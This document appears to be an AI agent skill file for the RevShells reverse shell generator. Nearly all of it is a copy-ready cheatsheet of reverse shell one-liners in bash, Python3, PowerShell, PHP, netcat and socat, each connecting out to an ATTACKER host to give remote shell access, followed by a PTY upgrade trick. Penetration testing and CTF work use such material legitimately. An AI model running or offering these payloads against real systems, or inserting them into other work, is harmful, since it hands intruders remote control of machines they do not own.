---
name: revshells
description: "Reverse shell one-liner generator (web UI and CLI) supporting 50+ shells. Use when quickly generating encoded reverse shell payloads for bash, Python, PowerShell, PHP, and other languages during exploitation."
license: MIT
compatibility: "Web: revshells.com; CLI: github.com/0dayCTF/reverse-shell-generator"
metadata:
  author: AeonDave
  version: "1.0"
---

# RevShells

Reverse shell one-liner generator — 50+ shells, encoded variants, web UI at revshells.com.

## Quick Start

```
# Web UI: https://revshells.com
# Enter: IP, Port, Shell type → Copy one-liner

# Popular one-liners (substitute IP/PORT):
```

## Shell Cheatsheet

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# PHP
php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat
nc -e /bin/sh ATTACKER PORT
nc ATTACKER PORT | /bin/sh | nc ATTACKER PORT2

# Socat
socat tcp:ATTACKER:PORT exec:'/bin/bash',pty,stderr,setsid,sigint,sane
```

## Upgrade Shell to PTY

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → export TERM=xterm
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Encoded variants and PTY upgrade techniques |
